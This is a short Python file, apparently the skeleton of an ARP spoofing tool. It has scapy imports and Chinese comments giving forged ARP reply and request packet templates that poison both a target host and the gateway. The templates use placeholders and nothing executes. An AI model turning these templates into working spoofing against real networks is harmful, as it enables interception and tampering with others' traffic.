# -*- coding: utf-8 -*

from scapy.all import get_if_hwaddr,getmacbyip,Ether,ARP,sendp

import sys
import time


'''
get_if_hwaddr:获取本机网络接口
getmacbyip:通过ip获取mac
Ether:组以太网数据包
ARP:组ARP包
sendp:在第二层发送数据包
'''


'''
欺骗主机:响应包
pkt = Ether(src=[1.102的MAC], dst=[1.18的Mac]) / ARP(1.102的MAC, 网关IP地址, hwdst=1.18MAC, pdst=1.18IP地址, op=2)
'''


'''
欺骗网关:响应包
pkt = Ether(src=[1.102的MAC], dst=[网关的Mac]) / ARP(1.102的MAC, 1. 18地址, hwdst=网关MAC, pdst=网关IP地址, op=2)
'''

'''
欺骗主机:请求包
pkt = Ether(src=[1.102的MAC], dst=[1. 18的Mac]) / ARP(1.102的MAC, 网关IP地址, hwdst=1.18MAC, pdst=1. 18IP地址, op=1)
'''

'''
欺骗网关:请求包
pkt = Ether(src=[1.102的MAC], dst=[网关的Mac]) / ARP(1.102的MAC, 1. 18地址, hwdst=网关MAC, pdst=网关IP地址, op=1)
'''

